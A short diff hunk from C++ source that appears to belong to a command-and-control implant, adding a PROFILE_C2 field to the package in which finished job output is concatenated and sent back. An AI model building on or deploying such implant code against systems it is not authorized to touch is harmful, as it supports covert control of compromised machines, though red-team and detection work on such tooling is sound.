@@ -66,6 +66,7 @@ auto DECLFN Jobs::Send(
             KhDbg( "concatenating job: %s", Current->UUID );
             KhDbg( "data at %p [%d bytes]", Current->Pkg->Buffer, Current->Pkg->Length );
 
+            Self->Pkg->Int32( PostJobs, PROFILE_C2 );
             Self->Pkg->Int32( PostJobs, Current->Pkg->Length );
             Self->Pkg->Pad( PostJobs, UC_PTR( Current->Pkg->Buffer ), Current->Pkg->Length );
             Current->State = KH_JOB_TERMINATE;
